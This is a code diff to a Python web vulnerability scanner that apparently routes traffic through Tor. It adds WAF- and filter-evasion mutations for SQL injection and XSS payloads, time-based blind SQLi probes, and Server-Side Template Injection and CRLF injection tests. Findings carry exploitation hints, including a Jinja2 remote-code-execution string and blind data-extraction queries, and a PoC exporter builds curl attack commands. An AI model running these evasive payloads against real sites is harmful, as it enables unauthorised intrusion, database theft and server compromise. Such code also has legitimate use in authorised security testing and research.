@@ -795,6 +795,20 @@ class VulnScanner:
         re.compile(r"Dynamic SQL Error", re.I),
     ]
 
+    # SSTI template engine error indicators
+    SSTI_INDICATORS = [
+        re.compile(r"jinja2\.", re.I),
+        re.compile(r"UndefinedError", re.I),
+        re.compile(r"TemplateSyntaxError", re.I),
+        re.compile(r"twig", re.I),
+        re.compile(r"freemarker", re.I),
+        re.compile(r"velocity", re.I),
+        re.compile(r"mako\.", re.I),
+        re.compile(r"smarty.*error", re.I),
+        re.compile(r"pebble.*exception", re.I),
+        re.compile(r"thymeleaf", re.I),
+    ]
+
     def __init__(self, session: TorSession):
         self._session = session
         self._page_params: List[str] = []
@@ -855,6 +869,165 @@ class VulnScanner:
                     break
             return combined
         return fallback[:5]
+
+    # ── Payload Mutation Engine ────────────────────────────────────────────
+    @staticmethod
+    def _mutate_sqli(base_payload: str) -> List[str]:
+        """Generate WAF-evasion variants of a SQLi payload.
+
+        Real WAFs block 'OR 1=1' but pass 'OR/**/1=1' or 'oR 1=1'.
+        This produces variants with case mutation, inline comments,
+        encoding tricks, and whitespace substitution.
+        """
+        variants = [base_payload]
+
+        # Case mutations on SQL keywords
+        keywords = ["OR", "AND", "SELECT", "UNION", "FROM", "WHERE",
+                    "NULL", "SLEEP", "WAITFOR", "DELAY", "BENCHMARK"]
+        mutated = base_payload
+        for kw in keywords:
+            if kw.upper() in base_payload.upper():
+                # Mixed case
+                mixed = "".join(c.upper() if i % 2 else c.lower()
+                                for i, c in enumerate(kw))
+                v1 = re.sub(re.escape(kw), mixed, base_payload, flags=re.I)
+                if v1 != base_payload:
+                    variants.append(v1)
+                # Inline comment
+                commented = kw[0] + "/**/" + kw[1:]
+                v2 = re.sub(re.escape(kw), commented, base_payload, flags=re.I)
+                if v2 != base_payload:
+                    variants.append(v2)
+
+        # Whitespace → inline comment substitution
+        v3 = base_payload.replace(" ", "/**/")
+        if v3 != base_payload:
+            variants.append(v3)
+
+        # Tab substitution
+        v4 = base_payload.replace(" ", "\t")
+        if v4 != base_payload:
+            variants.append(v4)
+
+        # Double URL encoding of quotes
+        v5 = base_payload.replace("'", "%2527")
+        if v5 != base_payload:
+            variants.append(v5)
+
+        return variants[:6]
+
+    @staticmethod
+    def _mutate_xss(base_payload: str) -> List[str]:
+        """Generate filter-evasion variants of XSS payloads."""
+        variants = [base_payload]
+
+        # Case mutation on tags
+        v1 = base_payload.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>")
+        if v1 != base_payload:
+            variants.append(v1)
+
+        # Using event handlers instead of script tags
+        if "<script>" in base_payload.lower():
+            canary = re.search(r">(.*?)<", base_payload)
+            if canary:
+                c = canary.group(1)
+                variants.append(f'<img src=x onerror="{c}">')
+                variants.append(f'<svg/onload="{c}">')
+                variants.append(f'<body onload="{c}">')
+                variants.append(f'<details open ontoggle="{c}">')
+
+        # HTML entity encoding
+        v2 = base_payload.replace("<", "&#60;").replace(">", "&#62;")
+        if v2 != base_payload:
+            variants.append(v2)
+
+        # Null byte insertion (bypasses some PHP filters)
+        v3 = base_payload.replace("<", "%00<")
+        if v3 != base_payload:
+            variants.append(v3)
+
+        return variants[:6]
+
+    # ── Response Diffing ───────────────────────────────────────────────────
+    @staticmethod
+    def _response_diff(baseline: str, test: str) -> dict:
+        """Structural diff between two HTML responses.
+
+        Goes beyond simple length comparison: checks content similarity,
+        keyword changes, and structural differences.
+        """
+        if not baseline or not test:
+            return {"similar": False, "score": 0.0}
+
+        bl = baseline[:10000]
+        tl = test[:10000]
+
+        len_ratio = min(len(bl), len(tl)) / max(len(bl), len(tl), 1)
+
+        # Word-level similarity (fast Jaccard-like)
+        bl_words = set(bl.lower().split())
+        tl_words = set(tl.lower().split())
+        if bl_words or tl_words:
+            common = bl_words & tl_words
+            total = bl_words | tl_words
+            word_sim = len(common) / len(total) if total else 0
+        else:
+            word_sim = 1.0
+
+        # Key structural elements (title, h1, form count)
+        def _extract_structure(html):
+            titles = re.findall(r"<title[^>]*>(.*?)</title>", html, re.I | re.S)
+            h1s = re.findall(r"<h1[^>]*>(.*?)</h1>", html, re.I | re.S)
+            forms = len(re.findall(r"<form", html, re.I))
+            return (titles[0][:50] if titles else "", h1s[0][:50] if h1s else "", forms)
+
+        s1 = _extract_structure(bl)
+        s2 = _extract_structure(tl)
+        struct_same = s1 == s2
+
+        score = (len_ratio * 0.3 + word_sim * 0.5 + (1.0 if struct_same else 0.0) * 0.2)
+
+        return {
+            "similar": score > 0.85,
+            "score": round(score, 3),
+            "len_ratio": round(len_ratio, 3),
+            "word_sim": round(word_sim, 3),
+            "struct_same": struct_same,
+        }
+
+    # ── JS Endpoint Extraction ─────────────────────────────────────────────
+    @staticmethod
+    def _extract_js_endpoints(html: str, base_url: str) -> List[str]:
+        """Extract API endpoints from JavaScript in HTML.
+
+        Catches fetch(), axios, XMLHttpRequest, and string-based URL patterns
+        that the <a href> crawler misses entirely.
+        """
+        endpoints = set()
+        domain = urlparse(base_url).netloc
+
+        # fetch/axios/XHR URL patterns
+        patterns = [
+            re.compile(r'''fetch\s*\(\s*['"]([^'"]+)['"]''', re.I),
+            re.compile(r'''axios\s*\.\w+\s*\(\s*['"]([^'"]+)['"]''', re.I),
+            re.compile(r'''\.open\s*\(\s*['"][A-Z]+['"]\s*,\s*['"]([^'"]+)['"]''', re.I),
+            re.compile(r'''url\s*[:=]\s*['"]([^'"]*(?:api|ajax|action|endpoint|query|search)[^'"]*)['"]''', re.I),
+            re.compile(r'''['"](/(?:api|v[0-9]|ajax|rest|graphql|ws)/[^'"]{2,60})['"]'''),
+            re.compile(r'''['"]([^'"]+\.(?:php|asp|aspx|jsp|cgi|pl|py)(?:\?[^'"]*)?)['"]\s*'''),
+            re.compile(r'''action\s*[:=]\s*['"]([^'"]+)['"]''', re.I),
+        ]
+
+        for pat in patterns:
+            for match in pat.findall(html[:200000]):
+                if match.startswith("http"):
+                    if domain in match:
+                        endpoints.add(match)
+                elif match.startswith("/"):
+                    endpoints.add(urljoin(base_url, match))
+                elif not match.startswith(("#", "javascript:", "data:", "mailto:")):
+                    endpoints.add(urljoin(base_url, match))
+
+        return list(endpoints)[:30]
 
     def crawl_for_endpoints(self, base_url: str, html: str, depth: int = 1) -> List[dict]:
         """Crawl the site to discover testable endpoints (URLs with params + forms).
@@ -946,6 +1119,26 @@ class VulnScanner:
                         "source": "form",
                     })
 
+        # Phase 0: extract JS endpoints (API routes the link crawler misses)
+        js_urls = self._extract_js_endpoints(html, base_url)
+        for js_url in js_urls:
+            parsed = urlparse(js_url)
+            if parsed.query:
+                params = parse_qs(parsed.query, keep_blank_values=True)
+                param_list = [{"name": k, "value": v[0] if v else "", "hidden": False, "type": "text"}
+                              for k, v in params.items()]
+                if param_list:
+                    endpoints.append({
+                        "url": f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
+                        "params": param_list,
+                        "method": "GET",
+                        "source": "javascript",
+                    })
+            clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+            if clean not in seen_urls:
+                seen_urls.add(clean)
+                pages_to_crawl.append(clean)
+
         # Phase 1: extract from the initial page HTML
         _extract_from_html(base_url, html)
 
@@ -1029,7 +1222,7 @@ class VulnScanner:
             baseline_text = baseline_resp.text[:8000] if baseline_resp else ""
             baseline_len = len(baseline_resp.text) if baseline_resp else 0
 
-            error_payloads = [
+            base_payloads = [
                 f"{pval}'",
                 f"{pval}\"",
                 f"{pval}'--",
@@ -1043,6 +1236,11 @@ class VulnScanner:
                 f"{pval}; SELECT 1-- -",
                 f"{pval}' AND 1=CONVERT(int,@@version)-- -",
             ]
+
+            # Generate WAF-evasion variants for key payloads
+            error_payloads = list(base_payloads)
+            for bp in base_payloads[4:7]:
+                error_payloads.extend(self._mutate_sqli(bp))
 
             for payload in error_payloads:
                 if shutdown_requested() or self._session.is_domain_blocked(domain):
@@ -1074,27 +1272,26 @@ class VulnScanner:
                             })
                             return findings
 
-            # === Phase B: Blind boolean-based detection ===
-            if baseline_len > 0:
+            # === Phase B: Blind boolean-based detection (with structural diff) ===
+            if baseline_resp and baseline_resp.text:
                 true_resp = self._send_test(endpoint, pname, f"{pval}' AND '1'='1")
                 false_resp = self._send_test(endpoint, pname, f"{pval}' AND '1'='2")
-                if true_resp and false_resp:
-                    true_len = len(true_resp.text)
-                    false_len = len(false_resp.text)
-                    # Significant length difference between true/false conditions
-                    # while true condition matches baseline = blind SQLi
-                    if (abs(true_len - baseline_len) < baseline_len * 0.1 and
-                            abs(false_len - baseline_len) > baseline_len * 0.15 and
-                            false_len != true_len):
+                if true_resp and false_resp and true_resp.text and false_resp.text:
+                    true_diff = self._response_diff(baseline_resp.text, true_resp.text)
+                    false_diff = self._response_diff(baseline_resp.text, false_resp.text)
+
+                    # True condition should be similar to baseline,
+                    # false condition should differ meaningfully
+                    if true_diff["similar"] and not false_diff["similar"]:
                         test_url = f"{url}?{pname}={quote(pval)}' AND '1'='1" if endpoint["method"] == "GET" else url
                         findings.append({
                             "severity": SEV_CRITICAL,
                             "title": f"Blind SQL injection via '{pname}' at {path}",
                             "detail": f"Response differs based on boolean SQL condition. "
-                                      f"true={true_len}B matches baseline={baseline_len}B, "
-                                      f"false={false_len}B differs significantly.",
-                            "evidence": f"param: {pname}, baseline: {baseline_len}B, "
-                                        f"AND 1=1: {true_len}B, AND 1=2: {false_len}B",
+                                      f"AND 1=1 similarity={true_diff['score']}, "
+                                      f"AND 1=2 similarity={false_diff['score']}.",
+                            "evidence": f"param: {pname}, true_sim={true_diff['score']}, "
+                                        f"false_sim={false_diff['score']}",
                             "exploitable": True,
                             "test_url": test_url,
                             "exploit_info": {
@@ -1102,12 +1299,64 @@ class VulnScanner:
                                 "parameter": pname,
                                 "path": path,
                                 "method": f"Blind boolean SQLi via '{pname}'. "
-                                          "Extract data bit-by-bit with: "
-                                          "' AND SUBSTRING(user(),1,1)='a' --",
+                                          "Extract data: ' AND SUBSTRING(user(),1,1)='a' --",
                                 "risk": "Full database access via blind extraction",
                             },
                         })
                         return findings
+
+            # === Phase C: Time-based blind detection ===
+            if not findings and baseline_resp:
+                time_payloads = [
+                    (f"{pval}' AND SLEEP(5)-- -", "MySQL SLEEP"),
+                    (f"{pval}'; SELECT pg_sleep(5)-- -", "PostgreSQL pg_sleep"),
+                    (f"{pval}'; WAITFOR DELAY '0:0:5'-- -", "MSSQL WAITFOR"),
+                    (f"{pval}' AND BENCHMARK(5000000,SHA1('test'))-- -", "MySQL BENCHMARK"),
+                    (f"{pval}' OR SLEEP(5)-- -", "MySQL OR SLEEP"),
+                ]
+
+                # Measure baseline timing
+                t0 = time.time()
+                _ = self._send_test(endpoint, pname, pval)
+                baseline_time = time.time() - t0
+
+                for payload, desc in time_payloads:
+                    if shutdown_requested() or self._session.is_domain_blocked(domain):
+                        break
+                    t0 = time.time()
+                    resp = self._send_test(endpoint, pname, payload)
+                    elapsed = time.time() - t0
+
+                    # If response took 4+ seconds longer than baseline = delay was injected
+                    if elapsed > baseline_time + 4.0 and elapsed > 4.5:
+                        # Confirm with a second measurement to reduce false positives
+                        t0 = time.time()
+                        resp2 = self._send_test(endpoint, pname, payload)
+                        elapsed2 = time.time() - t0
+
+                        if elapsed2 > baseline_time + 4.0 and elapsed2 > 4.5:
+                            test_url = f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url
+                            findings.append({
+                                "severity": SEV_CRITICAL,
+                                "title": f"Time-based blind SQLi via '{pname}' at {path}",
+                                "detail": f"Response delayed by {desc}. "
+                                          f"Baseline: {baseline_time:.1f}s, "
+                                          f"payload: {elapsed:.1f}s, confirm: {elapsed2:.1f}s.",
+                                "evidence": f"param: {pname}, {desc}, "
+                                            f"delay: {elapsed:.1f}s / {elapsed2:.1f}s vs baseline {baseline_time:.1f}s",
+                                "exploitable": True,
+                                "test_url": test_url,
+                                "exploit_info": {
+                                    "type": "sqli",
+                                    "parameter": pname,
+                                    "path": path,
+                                    "method": f"Time-based blind SQLi via '{pname}'. "
+                                              f"Confirmed with {desc}. "
+                                              "Extract data: ' AND IF(SUBSTRING(user(),1,1)='a',SLEEP(5),0)-- -",
+                                    "risk": "Full database access via time-based extraction",
+                                },
+                            })
+                            return findings
 
         return findings
 
@@ -1279,6 +1528,180 @@ class VulnScanner:
                         pass
         return findings
 
+    def _test_endpoint_ssti(self, endpoint: dict) -> List[dict]:
+        """Test for Server-Side Template Injection.
+
+        SSTI allows arbitrary code execution when user input is rendered
+        through a template engine (Jinja2, Twig, Freemarker, etc.).
+        """
+        findings = []
+        url = endpoint["url"]
+        domain = urlparse(url).netloc
+        path = urlparse(url).path or "/"
+        if self._session.is_domain_blocked(domain):
+            return findings
+
+        testable = [p for p in endpoint["params"] if not p.get("hidden")]
+        if not testable:
+            testable = endpoint["params"][:1]
+
+        # Use math expressions that produce known outputs
+        marker_a, marker_b = secrets.randbelow(90) + 10, secrets.randbelow(90) + 10
+        expected = str(marker_a * marker_b)
+
+        payloads = [
+            (f"{{{{{marker_a}*{marker_b}}}}}", "Jinja2/Twig"),
+            (f"${{{marker_a}*{marker_b}}}", "Freemarker/Velocity/EL"),
+            (f"<%= {marker_a}*{marker_b} %>", "ERB/JSP"),
+            (f"#{{{marker_a}*{marker_b}}}", "Ruby/Pebble"),
+            (f"${{={marker_a}*{marker_b}}}", "Smarty"),
+        ]
+
+        for param_info in testable[:2]:
+            pname = param_info["name"]
+            for payload, engine in payloads:
+                if shutdown_requested() or self._session.is_domain_blocked(domain):
+                    return findings
+                resp = self._send_test(endpoint, pname, payload)
+                if not resp or not resp.text:
+                    continue
+
+                # Check if the math was evaluated (the computed result appears)
+                if expected in resp.text:
+                    # Verify it's not just the raw expression being echoed
+                    raw_expr = f"{marker_a}*{marker_b}"
+                    if raw_expr not in resp.text:
+                        findings.append({
+                            "severity": SEV_CRITICAL,
+                            "title": f"SSTI ({engine}) via '{pname}' at {path}",
+                            "detail": f"Template expression {{{{{marker_a}*{marker_b}}}}} "
+                                      f"evaluated to {expected}. Server-side code execution confirmed.",
+                            "evidence": f"param: {pname}, input: {payload[:30]}, "
+                                        f"output contains: {expected}",
+                            "exploitable": True,
+                            "test_url": f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url,
+                            "exploit_info": {
+                                "type": "ssti",
+                                "parameter": pname,
+                                "path": path,
+                                "method": f"SSTI via '{pname}' at {path}. Engine: {engine}. "
+                                          "For RCE (Jinja2): "
+                                          "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+                                "risk": "Remote code execution, full server compromise",
+                            },
+                        })
+                        return findings
+
+                # Check for template engine error messages
+                for ind in self.SSTI_INDICATORS:
+                    if ind.search(resp.text[:5000]):
+                        findings.append({
+                            "severity": SEV_HIGH,
+                            "title": f"Possible SSTI ({engine}) via '{pname}' at {path}",
+                            "detail": "Template engine error triggered by expression injection.",
+                            "evidence": f"param: {pname}, engine indicator: {ind.pattern[:30]}",
+                            "exploitable": True,
+                            "test_url": f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url,
+                            "exploit_info": {
+                                "type": "ssti",
+                                "parameter": pname,
+                                "path": path,
+                                "method": f"SSTI indicators from {engine}. "
+                                          "Confirm with: {{7*7}} → look for 49",
+                                "risk": "Potential remote code execution",
+                            },
+                        })
+                        return findings
+        return findings
+
+    def _test_endpoint_crlf(self, endpoint: dict) -> List[dict]:
+        """Test for CRLF injection / HTTP header injection."""
+        findings = []
+        url = endpoint["url"]
+        domain = urlparse(url).netloc
+        path = urlparse(url).path or "/"
+        if self._session.is_domain_blocked(domain):
+            return findings
+
+        testable = [p for p in endpoint["params"] if not p.get("hidden")]
+        if not testable:
+            return findings
+
+        crlf_marker = f"gs{secrets.token_hex(4)}"
+
+        payloads = [
+            (f"%0d%0aX-Injected: {crlf_marker}", "URL-encoded CRLF"),
+            (f"%0aX-Injected: {crlf_marker}", "LF only"),
+            (f"\r\nX-Injected: {crlf_marker}", "raw CRLF"),
+        ]
+
+        for param_info in testable[:2]:
+            pname = param_info["name"]
+            for payload, desc in payloads:
+                if shutdown_requested() or self._session.is_domain_blocked(domain):
+                    return findings
+
+                if endpoint["method"] == "GET":
+                    test_url = f"{url}?{pname}={payload}"
+                    try:
+                        self._session._delay_for_domain(domain)
+                        resp = self._session._session.get(
+                            test_url, timeout=REQUEST_TIMEOUT,
+                            proxies=self._session._proxy, headers=_pick_profile(),
+                            allow_redirects=False
+                        )
+                    except Exception:
+                        continue
+                else:
+                    resp = self._send_test(endpoint, pname, payload)
+
+                if resp is None:
+                    continue
+
+                # Check if our header was injected into the response headers
+                injected = resp.headers.get("X-Injected", "")
+                if crlf_marker in injected:
+                    findings.append({
+                        "severity": SEV_HIGH,
+                        "title": f"CRLF injection via '{pname}' at {path}",
+                        "detail": "HTTP header injection confirmed. Attacker can inject "
+                                  "arbitrary headers (Set-Cookie, Location, etc.).",
+                        "evidence": f"param: {pname}, {desc}, "
+                                    f"X-Injected: {crlf_marker} appeared in response headers",
+                        "exploitable": True,
+                        "test_url": f"{url}?{pname}={payload}" if endpoint["method"] == "GET" else url,
+                        "exploit_info": {
+                            "type": "crlf",
+                            "parameter": pname,
+                            "path": path,
+                            "method": f"CRLF injection via '{pname}'. "
+                                      "Inject Set-Cookie to fixate sessions, "
+                                      "or Location header for redirect.",
+                            "risk": "Session fixation, cache poisoning, XSS via injected headers",
+                        },
+                    })
+                    return findings
+
+                # Check for header value in response body (some frameworks echo it)
+                if resp.text and f"X-Injected: {crlf_marker}" in resp.text:
+                    findings.append({
+                        "severity": SEV_MEDIUM,
+                        "title": f"Possible CRLF injection via '{pname}' at {path}",
+                        "detail": "CRLF payload reflected in response body.",
+                        "evidence": f"param: {pname}, {desc}, reflected in body",
+                        "exploitable": True,
+                        "test_url": f"{url}?{pname}={payload}" if endpoint["method"] == "GET" else url,
+                        "exploit_info": {
+                            "type": "crlf",
+                            "parameter": pname,
+                            "path": path,
+                            "method": "CRLF reflected in body — may indicate header injection.",
+                            "risk": "Header injection, potential XSS",
+                        },
+                    })
+                    return findings
+        return findings
+
     @staticmethod
     def _add_confidence(findings: List[dict], base_confidence: float) -> List[dict]:
         """Add confidence score to findings.
@@ -1428,6 +1851,18 @@ class VulnScanner:
                     ep_findings.extend(lfi)
                 except Exception as e:
                     integrity_log("intel", f"lfi_error:{path}:{type(e).__name__}")
+
+                try:
+                    ssti = self._test_endpoint_ssti(ep)
+                    ep_findings.extend(ssti)
+                except Exception as e:
+                    integrity_log("intel", f"ssti_error:{path}:{type(e).__name__}")
+
+                try:
+                    crlf = self._test_endpoint_crlf(ep)
+                    ep_findings.extend(crlf)
+                except Exception as e:
+                    integrity_log("intel", f"crlf_error:{path}:{type(e).__name__}")
 
                 if ep_findings:
                     self._add_confidence(ep_findings, 0.9)
@@ -2865,6 +3300,32 @@ class PoCExporter:
             )
             poc["description"] = "WordPress XML-RPC is enabled. Enumerate methods, attempt brute-force."
             poc["remediation"] = "Disable XML-RPC or restrict access via .htaccess."
+
+        elif exploit_type == "ssti" and param:
+            poc["curl"] = f'curl {sp} "[TARGET_URL]?{param}={{{{7*7}}}}"'
+            poc["description"] = (
+                f"Server-Side Template Injection via '{param}'. "
+                f"Template expressions are evaluated server-side."
+            )
+            poc["remediation"] = "Never render user input through template engines. Use sandboxed templates."
+
+        elif exploit_type == "crlf" and param:
+            poc["curl"] = f'curl -v {sp} "[TARGET_URL]?{param}=%0d%0aSet-Cookie:%20injected=1"'
+            poc["description"] = (
+                f"CRLF / HTTP header injection via '{param}'. "
+                f"Attacker can inject arbitrary response headers."
+            )
+            poc["remediation"] = "Strip CR/LF characters from user input before use in headers."
+
+        elif exploit_type == "graphql_data_exposure" and path:
+            poc["curl"] = (
+                f'curl {sp} '
+                f'-X POST -H "Content-Type: application/json" '
+                f'-d \'{{"query": "{{ __schema {{ types {{ name fields {{ name }} }} }} }}"}}\' '
+                f'"[TARGET_URL]{path}"'
+            )
+            poc["description"] = "GraphQL schema exposes sensitive types/fields."
+            poc["remediation"] = "Disable introspection. Implement field-level authorization."
 
         else:
             poc["curl"] = "# Manual verification required"
